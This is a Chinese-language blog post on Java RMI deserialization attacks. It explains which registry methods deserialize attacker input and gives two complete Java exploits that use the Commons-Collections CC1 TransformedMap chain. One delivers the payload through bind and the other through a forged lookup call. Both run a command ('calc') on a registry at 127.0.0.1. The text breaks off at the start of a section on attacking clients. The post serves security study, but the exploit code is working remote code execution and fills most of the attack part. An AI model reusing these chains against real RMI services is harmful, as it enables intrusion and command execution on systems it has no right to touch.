<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>RMI_2 | 红烧花园宝宝</title><meta name="author" content="红烧花园宝宝"><meta name="copyright" content="红烧花园宝宝"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="前言前一个专题,我们对RMI的基础和通信原理进行了简单的分析,这一期对攻击方法进行一个总结参考:Java反序列化之RMI专题02-RMI的几种攻击方式 | Drunkbaby’s BlogRMI攻击方式 | CurlySean’s Blog RMI的基本攻击方式 RMI Client 打 RMI Registry RMI Client 打 RMI Server RMI Client  攻击RMI">
<meta property="og:type" content="article">
<meta property="og:title" content="RMI_2">
<meta property="og:url" content="https://lxu2n.github.io/posts/67304d02/index.html">
<meta property="og:site_name" content="红烧花园宝宝">
<meta property="og:description" content="前言前一个专题,我们对RMI的基础和通信原理进行了简单的分析,这一期对攻击方法进行一个总结参考:Java反序列化之RMI专题02-RMI的几种攻击方式 | Drunkbaby’s BlogRMI攻击方式 | CurlySean’s Blog RMI的基本攻击方式 RMI Client 打 RMI Registry RMI Client 打 RMI Server RMI Client  攻击RMI">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://lxu2n.github.io/image/1.png">
<meta property="article:published_time" content="2025-12-31T08:57:09.000Z">
<meta property="article:modified_time" content="2025-12-31T08:58:06.753Z">
<meta property="article:author" content="红烧花园宝宝">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://lxu2n.github.io/image/1.png"><script type="application/ld+json">{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "RMI_2",
  "url": "https://lxu2n.github.io/posts/67304d02/",
  "image": "https://lxu2n.github.io/image/1.png",
  "datePublished": "2025-12-31T08:57:09.000Z",
  "dateModified": "2025-12-31T08:58:06.753Z",
  "author": [
    {
      "@type": "Person",
      "name": "红烧花园宝宝",
      "url": "https://lxu2n.github.io/"
    }
  ]
}</script><link rel="shortcut icon" href="/image/6.png"><link rel="canonical" href="https://lxu2n.github.io/posts/67304d02/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"><link rel="preconnect" href="//busuanzi.ibruce.info"><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><script>
    (() => {
      
    const saveToLocal = {
      set: (key, value, ttl) => {
        if (!ttl) return
        const expiry = Date.now() + ttl * 86400000
        localStorage.setItem(key, JSON.stringify({ value, expiry }))
      },
      get: key => {
        const itemStr = localStorage.getItem(key)
        if (!itemStr) return undefined
        const { value, expiry } = JSON.parse(itemStr)
        if (Date.now() > expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return value
      }
    }

    window.btf = {
      saveToLocal,
      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
        script.onload = script.onreadystatechange = () => {
          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
        }
        script.onerror = reject
        document.head.appendChild(script)
      }),
      getCSS: (url, id) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onload = link.onreadystatechange = () => {
          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
        }
        link.onerror = reject
        document.head.appendChild(link)
      }),
      addGlobalFn: (key, fn, name = false, parent = window) => {
        if (!false && key.startsWith('pjax')) return
        const globalFn = parent.globalFn || {}
        globalFn[key] = globalFn[key] || {}
        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
        parent.globalFn = globalFn
      }
    }
  
      
      const activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      const activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }

      btf.activateDarkMode = activateDarkMode
      btf.activateLightMode = activateLightMode

      const theme = saveToLocal.get('theme')
    
          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
        
      
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
      }
    
      
    const detectApple = () => {
      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
  
    })()
  </script><script>const GLOBAL_CONFIG = {
  root: '/',
  algolia: undefined,
  localSearch: {"path":"/search.xml","preload":false,"top_n_per_article":1,"unescape":false,"languages":{"hits_empty":"未找到符合您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
  translate: undefined,
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
  copy: {
    success: '复制成功',
    error: '复制失败',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '天',
  dateSuffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'null',
  Snackbar: undefined,
  infinitegrid: {
    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
    buttonText: '加载更多'
  },
  isPhotoFigcaption: false,
  islazyloadPlugin: false,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: false,
  },
  autoDarkmode: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'RMI_2',
  isHighlightShrink: false,
  isToc: true,
  pageType: 'post'
}</script></head><body><canvas id="bubble_canvas" style="position:fixed;top:0;left:0;width:100%;height:100%;z-index:999999;pointer-events:none"></canvas><link rel="stylesheet" href="/css/transpancy.css"><link rel="stylesheet" href="/css/modify.css"><link rel="stylesheet" href="/styles/main.css"><script src="https://cdn.bootcss.com/jquery/3.4.1/jquery.min.js"></script><meta name="generator" content="Hexo 7.3.0"><div id="loading-box"><div class="loading-left-bg"></div><div class="loading-right-bg"></div><div class="spinner-box"><div class="configure-border-1"><div class="configure-core"></div></div><div class="configure-border-2"><div class="configure-core"></div></div><div class="loading-word">加载中...</div></div></div><script>(()=>{
  const $loadingBox = document.getElementById('loading-box')
  const $body = document.body
  const preloader = {
    endLoading: () => {
      $body.style.overflow = ''
      $loadingBox.classList.add('loaded')
    },
    initLoading: () => {
      $body.style.overflow = 'hidden'
      $loadingBox.classList.remove('loaded')
    }
  }

  preloader.initLoading()
  window.addEventListener('load', preloader.endLoading)

  if (false) {
    btf.addGlobalFn('pjaxSend', preloader.initLoading, 'preloader_init')
    btf.addGlobalFn('pjaxComplete', preloader.endLoading, 'preloader_end')
  }
})()</script><div id="web_bg" style="background-image: url(https://lxu2n.top/image/2.png);"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/image/1.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">53</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">16</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/categories"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header"><nav id="nav"><!-- 左侧博客信息区域--><span id="blog-info"><a class="nav-site-title" href="/"><img class="site-icon" src="/image/6.png" alt="Logo"><span class="site-name">红烧花园宝宝</span></a><a class="nav-page-title" href="/"><span class="site-name">RMI_2</span></a></span><!-- 新增的导航菜单容器（居中布局关键）--><div id="nav-menus-container"><!-- 菜单主体部分--><div id="menus"><!-- 菜单项--><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/categories"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div></div></div></div><!-- 右侧功能区域（新增容器）--><div id="nav-right-container"><!-- 搜索按钮（移动到右侧）--><div id="search-button"><span class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></span></div><!-- 移动端汉堡菜单按钮--><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">RMI_2</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2025-12-31T08:57:09.000Z" title="发表于 2025-12-31 16:57:09">2025-12-31</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2025-12-31T08:58:06.753Z" title="更新于 2025-12-31 16:58:06">2025-12-31</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/Java%E5%AE%89%E5%85%A8/">Java安全</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/Java%E5%AE%89%E5%85%A8/RMI/">RMI</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>前一个专题,我们对RMI的基础和通信原理进行了简单的分析,这一期对攻击方法进行一个总结<br>参考:<a target="_blank" rel="noopener" href="https://drun1baby.top/2022/07/23/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BRMI%E4%B8%93%E9%A2%9802-RMI%E7%9A%84%E5%87%A0%E7%A7%8D%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F/#0x03-%E5%B0%8F%E7%BB%93">Java反序列化之RMI专题02-RMI的几种攻击方式 | Drunkbaby’s Blog</a><br><a target="_blank" rel="noopener" href="https://curlysean.github.io/2025/03/06/RMI%E6%94%BB%E5%87%BB%E6%89%8B%E6%B3%95/#CYWBr">RMI攻击方式 | CurlySean’s Blog</a></p>
<h1 id="RMI的基本攻击方式"><a href="#RMI的基本攻击方式" class="headerlink" title="RMI的基本攻击方式"></a>RMI的基本攻击方式</h1><ul>
<li>RMI Client 打 RMI Registry</li>
<li>RMI Client 打 RMI Server</li>
<li>RMI Client</li>
</ul>
<h2 id="攻击RMI-registry"><a href="#攻击RMI-registry" class="headerlink" title="攻击RMI registry"></a>攻击RMI registry</h2><p>只能够通过客户端打registry.<br>根据上篇文章的分析,我们要去找一下反序列的点位在哪里<br>我们在使用一下语句时,会调用了lookup</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">IRemoteOBJ remoteOBJ = (IRemoteOBJ) registry.lookup("rmiserver");</span><br></pre></td></tr></tbody></table></figure>
<p>而这个lookup这里对应着注册中心(特殊的服务端的skel),这时就会调用到<br><img src="/posts/67304d02/20251231142806963.png" alt="image.png"><br>case2,这都是我们之前分析过的,所以不同的方法对应着不同的case<br>0-&gt;bind<br>1-&gt;list<br>2-&gt;lookup<br>3-&gt;rebind<br>4-&gt;unbind<br>那么,我们就可以通过这里不同的方法去调用到不同的case里的readObject方法</p>
<h3 id="使用list方法交互"><a href="#使用list方法交互" class="headerlink" title="使用list方法交互"></a>使用list方法交互</h3><p><img src="/posts/67304d02/20251231143327934.png" alt="image.png"><br>list这里无反序列化的点,就不浪费时间了.</p>
<h3 id="使用bind或rebind进行交互"><a href="#使用bind或rebind进行交互" class="headerlink" title="使用bind或rebind进行交互"></a>使用bind或rebind进行交互</h3><p>先看源码<br><img src="/posts/67304d02/20251231143513391.png" alt="image.png"><br><img src="/posts/67304d02/20251231143544574.png" alt="image.png"><br>都是可以进行反序列化的<br>这里进行反序列化的是远程对象和传来的字符串(name),所以如果是存在cc的依赖的话,我们在这里就可以打一个cc链的漏洞,来进行命令执行<br>依赖</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependencies&gt;    </span><br><span class="line"> &lt;!-- https://mvnrepository.com/artifact/commons-collections/commons-collections --&gt;    </span><br><span class="line"> 	&lt;dependency&gt;    </span><br><span class="line"> 	&lt;groupId&gt;commons-collections&lt;/groupId&gt;    </span><br><span class="line">	 &lt;artifactId&gt;commons-collections&lt;/artifactId&gt;    </span><br><span class="line">	 &lt;version&gt;3.2.1&lt;/version&gt;    </span><br><span class="line"> &lt;/dependency&gt;&lt;/dependencies&gt;</span><br></pre></td></tr></tbody></table></figure>

<p>远程对象在两者间传递的时候,传递的是一个Proxy的动态代理对象,而在使用bind的方法时需要的是remote类型的对象,所以我们需要一个能实现remote接口的动态代理类<br>这时我们可以使用<br>这个newProxyInstance方法创建代理类,需要<code>InvocationHandler</code>示例，所以我们需要将恶意类转为<code>InvocationHandler</code>类</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">@CallerSensitive  </span><br><span class="line">    public static Object newProxyInstance(ClassLoader loader,  </span><br><span class="line">                                          Class&lt;?&gt;[] interfaces,  </span><br><span class="line">                                          InvocationHandler h)  </span><br><span class="line">        throws IllegalArgumentException  </span><br><span class="line">    {  </span><br><span class="line">        ......  </span><br><span class="line">        try {  </span><br><span class="line">            if (sm != null) {  </span><br><span class="line">                checkNewProxyPermission(Reflection.getCallerClass(), cl);  </span><br><span class="line">            }  </span><br><span class="line">  </span><br><span class="line">            final Constructor&lt;?&gt; cons = cl.getConstructor(constructorParams);  </span><br><span class="line">            final InvocationHandler ih = h;  </span><br><span class="line">            if (!Modifier.isPublic(cl.getModifiers())) {  </span><br><span class="line">                AccessController.doPrivileged(new PrivilegedAction&lt;Void&gt;() {  </span><br><span class="line">                    public Void run() {  </span><br><span class="line">                        cons.setAccessible(true);  </span><br><span class="line">                        return null;  </span><br><span class="line">                    }  </span><br><span class="line">                });  </span><br><span class="line">            }  </span><br><span class="line">            return cons.newInstance(new Object[]{h});  </span><br><span class="line">        } ......  </span><br><span class="line">    }</span><br></pre></td></tr></tbody></table></figure>
<p>exp</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line">import javafx.scene.transform.Transform;  </span><br><span class="line">import org.apache.commons.collections.Transformer;  </span><br><span class="line">import org.apache.commons.collections.functors.ChainedTransformer;  </span><br><span class="line">import org.apache.commons.collections.functors.ConstantTransformer;  </span><br><span class="line">import org.apache.commons.collections.functors.InvokerTransformer;  </span><br><span class="line">import org.apache.commons.collections.map.TransformedMap;  </span><br><span class="line">import sun.util.resources.cldr.st.CalendarData_st_LS;  </span><br><span class="line">  </span><br><span class="line">import java.io.*;  </span><br><span class="line">import java.lang.annotation.Target;  </span><br><span class="line">import java.lang.reflect.Constructor;  </span><br><span class="line">import java.lang.reflect.InvocationHandler;  </span><br><span class="line">import java.lang.reflect.Method;  </span><br><span class="line">import java.lang.reflect.Proxy;  </span><br><span class="line">import java.rmi.Remote;  </span><br><span class="line">import java.rmi.registry.LocateRegistry;  </span><br><span class="line">import java.rmi.registry.Registry;  </span><br><span class="line">import java.util.HashMap;  </span><br><span class="line">import java.util.Map;  </span><br><span class="line">  </span><br><span class="line">import static java.lang.reflect.Proxy.newProxyInstance;  </span><br><span class="line">  </span><br><span class="line">public class RemoteBind {  </span><br><span class="line">    public static void main(String[] args) throws Exception {  </span><br><span class="line">        Registry registry = LocateRegistry.getRegistry("127.0.0.1",1099);  </span><br><span class="line">        InvocationHandler invocationHandler = (InvocationHandler) CC1();  </span><br><span class="line">        Remote remote = Remote.class.cast(newProxyInstance(Remote.class.getClassLoader(), new Class[]{Remote.class}, invocationHandler));  </span><br><span class="line">        registry.bind("rmiserver",remote);  </span><br><span class="line">  </span><br><span class="line">    }  </span><br><span class="line">  </span><br><span class="line">    public static Object CC1() throws Exception {  </span><br><span class="line">  </span><br><span class="line">            Class c = Runtime.class;  </span><br><span class="line">  </span><br><span class="line">//        Method invokerTransformer = (Method) new InvokerTransformer("getDeclaredMethod", new Class[]{String.class,Class[].class}, new Object[]{"getRuntime", null}).transform(c);  </span><br><span class="line">//        Runtime r= (Runtime) new InvokerTransformer("invoke",new Class[]{Object.class,Object[].class},new Object[]{null,null}).transform(invokerTransformer);  </span><br><span class="line">//        new InvokerTransformer("exec",new Class[]{String.class}, new Object[]{"calc"}).transform(r);  </span><br><span class="line">  </span><br><span class="line">            Transformer[] t =  new Transformer[]{  </span><br><span class="line">                    new ConstantTransformer(c),  </span><br><span class="line">                    new InvokerTransformer("getDeclaredMethod", new Class[]{String.class,Class[].class}, new Object[]{"getRuntime", null}),  </span><br><span class="line">                    new InvokerTransformer("invoke",new Class[]{Object.class,Object[].class},new Object[]{null,null}),  </span><br><span class="line">                    new InvokerTransformer("exec",new Class[]{String.class}, new Object[]{"calc"})  </span><br><span class="line">            };  </span><br><span class="line">            ChainedTransformer chainedtransformer = new ChainedTransformer(t);  </span><br><span class="line">  </span><br><span class="line">            HashMap&lt;Object,Object&gt; map = new HashMap&lt;&gt;();  </span><br><span class="line">            map.put("value","value");  </span><br><span class="line">            Map&lt;Object,Object&gt; decorate = TransformedMap.decorate(map, null, chainedtransformer);  </span><br><span class="line">  </span><br><span class="line">            Class cc = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");  </span><br><span class="line">            Constructor declaredConstructor = cc.getDeclaredConstructor(Class.class, Map.class);  </span><br><span class="line">            declaredConstructor.setAccessible(true);  </span><br><span class="line">            Object o = declaredConstructor.newInstance(Target.class,decorate);  </span><br><span class="line">  </span><br><span class="line">            return o;  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">//        Method m = c.getDeclaredMethod("getRuntime",null);  </span><br><span class="line">//        m.setAccessible(true);  </span><br><span class="line">//        Runtime o = (Runtime) m.invoke(null,null);  </span><br><span class="line">//        o.exec("calc");  </span><br><span class="line">  </span><br><span class="line">        }  </span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
<p>``<br><code>Remote remote = Remote.class.cast(newProxyInstance(Remote.class.getClassLoader(), new Class[]{Remote.class}, invocationHandler));</code> //这行代码的核心作用是利用 Java 反射机制创建一个动态代理对象，并将其强制转换为 Remote 接口类型<br>使用rebind的话改一下方法就可以了<br><img src="/posts/67304d02/20251231152353726.png" alt="image.png"></p>
<h3 id="使用unbind和uplook进行交互"><a href="#使用unbind和uplook进行交互" class="headerlink" title="使用unbind和uplook进行交互"></a>使用unbind和uplook进行交互</h3><p><img src="/posts/67304d02/20251231152555425.png" alt="image.png"><br><img src="/posts/67304d02/20251231152605962.png" alt="image.png"><br>实际上这两者的攻击思路和<code>bind/rebind</code>是相类似的，但是<code>lookup</code>这里只能传入<code>String</code>字符串，我们可以通过伪造<code>lookup</code>连接请求，使其可以传入对象<br>也就是进行一个可以传入对象的lookup请求<br>exp</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line">import org.apache.commons.collections.Transformer;  </span><br><span class="line">import org.apache.commons.collections.functors.ChainedTransformer;  </span><br><span class="line">import org.apache.commons.collections.functors.ConstantTransformer;  </span><br><span class="line">import org.apache.commons.collections.functors.InvokerTransformer;  </span><br><span class="line">import org.apache.commons.collections.map.TransformedMap;  </span><br><span class="line">import sun.rmi.server.UnicastRef;  </span><br><span class="line">  </span><br><span class="line">import java.io.ObjectOutput;  </span><br><span class="line">import java.lang.annotation.Target;  </span><br><span class="line">import java.lang.reflect.*;  </span><br><span class="line">import java.rmi.Remote;  </span><br><span class="line">import java.rmi.registry.LocateRegistry;  </span><br><span class="line">import java.rmi.registry.Registry;  </span><br><span class="line">import java.rmi.server.RemoteCall;  </span><br><span class="line">import java.rmi.server.RemoteObject;  </span><br><span class="line">import java.util.HashMap;  </span><br><span class="line">import java.util.Map;  </span><br><span class="line">  </span><br><span class="line">public class RemoteBind {  </span><br><span class="line">    public static void main(String[] args) throws Exception {  </span><br><span class="line">        // 1. 获取 Registry        Registry registry = LocateRegistry.getRegistry("127.0.0.1", 1099);  </span><br><span class="line">  </span><br><span class="line">        // 2. 生成恶意 Payload (CC1 链包装在 InvocationHandler 中)  </span><br><span class="line">        InvocationHandler invocationHandler = (InvocationHandler) CC1();  </span><br><span class="line">  </span><br><span class="line">        // 3. 将 Payload 包装成 Remote 代理对象  </span><br><span class="line">        // 因为 bind 方法要求第二个参数必须是 Remote 类型  </span><br><span class="line">        Remote remotePayload = (Remote) Proxy.newProxyInstance(  </span><br><span class="line">                Remote.class.getClassLoader(),  </span><br><span class="line">                new Class[]{Remote.class},  </span><br><span class="line">                invocationHandler  </span><br><span class="line">        );  </span><br><span class="line">  </span><br><span class="line">        // 4. 获取 registry 代理中的 UnicastRef 对象  </span><br><span class="line">        // 动态代理的 Handler 是 RemoteObjectInvocationHandler，它的父类 RemoteObject 中有 ref 字段  </span><br><span class="line">        Field[] fields_0 = registry.getClass().getSuperclass().getSuperclass().getDeclaredFields();  </span><br><span class="line">        fields_0[0].setAccessible(true);  </span><br><span class="line">        UnicastRef ref = (UnicastRef) fields_0[0].get(registry);  </span><br><span class="line">  </span><br><span class="line">        // 5. 伪造 RMI 请求 (利用 lookup 方法)  </span><br><span class="line">        // newCall(RemoteObject obj, Operation[] operations, int opnum, long interfaceHash)        // 0: bind, 1: list, 2: lookup, 3: rebind, 4: unbind        // 传入 null 作为 operations，因为我们直接指定了 opnum 和 hash        RemoteCall var2 = ref.newCall((RemoteObject) registry, null, 2, 4905912898345647071L);  </span><br><span class="line">  </span><br><span class="line">        ObjectOutput var3 = var2.getOutputStream();  </span><br><span class="line">  </span><br><span class="line">        // bind(String name, Remote obj)  </span><br><span class="line">        //lookup(Remote obj)        // 必须按照服务端参数顺序写入：先写名字，再写恶意对象  </span><br><span class="line">        var3.writeObject(remotePayload);  </span><br><span class="line">  </span><br><span class="line">        // 6. 发送请求  </span><br><span class="line">        // 这一步会触发服务端的反序列化  </span><br><span class="line">        try {  </span><br><span class="line">            ref.invoke(var2);  </span><br><span class="line">        } catch (Exception e) {  </span><br><span class="line">            // 服务端反序列化成功后通常会抛出异常，因为本地的逻辑并不完整，但这代表攻击已经发送  </span><br><span class="line">            System.out.println("Payload sent. Check the server.");  </span><br><span class="line">            // e.printStackTrace();  </span><br><span class="line">        }  </span><br><span class="line">    }  </span><br><span class="line">  </span><br><span class="line">    public static Object CC1() throws Exception {  </span><br><span class="line">        // 标准 CC1 TransformedMap 链  </span><br><span class="line">        Transformer[] t = new Transformer[]{  </span><br><span class="line">                new ConstantTransformer(Runtime.class),  </span><br><span class="line">                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),  </span><br><span class="line">                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, null}),  </span><br><span class="line">                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"})  </span><br><span class="line">        };  </span><br><span class="line">        ChainedTransformer chainedtransformer = new ChainedTransformer(t);  </span><br><span class="line">  </span><br><span class="line">        HashMap&lt;Object, Object&gt; map = new HashMap&lt;&gt;();  </span><br><span class="line">        map.put("value", "value"); // Key 必须是 "value"，因为 Target 注解中有 value() 方法  </span><br><span class="line">        Map&lt;Object, Object&gt; decorate = TransformedMap.decorate(map, null, chainedtransformer);  </span><br><span class="line">  </span><br><span class="line">        // 获取 AnnotationInvocationHandler 的构造器  </span><br><span class="line">        Class&lt;?&gt; cc = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");  </span><br><span class="line">        Constructor&lt;?&gt; declaredConstructor = cc.getDeclaredConstructor(Class.class, Map.class);  </span><br><span class="line">        declaredConstructor.setAccessible(true);  </span><br><span class="line">  </span><br><span class="line">        // 实例化 Handler        Object o = declaredConstructor.newInstance(Target.class, decorate);  </span><br><span class="line">  </span><br><span class="line">        return o;  </span><br><span class="line">    }  </span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>

<p><img src="/posts/67304d02/20251231154459743.png" alt="image.png"></p>
<h2 id="攻击客户端"><a href="#攻击客户端" class="headerlink" title="攻击客户端"></a>攻击客户端</h2><h3 id="注册中心攻击客户端"><a href="#注册中心攻击客户端" class="headerlink" title="注册中心攻击客户端"></a>注册中心攻击客户端</h3><p>那么还是离不开刚刚分析的那几个方法</p>
<ul>
<li>bind</li>
<li>unbind</li>
<li>rebind</li>
<li>list</li>
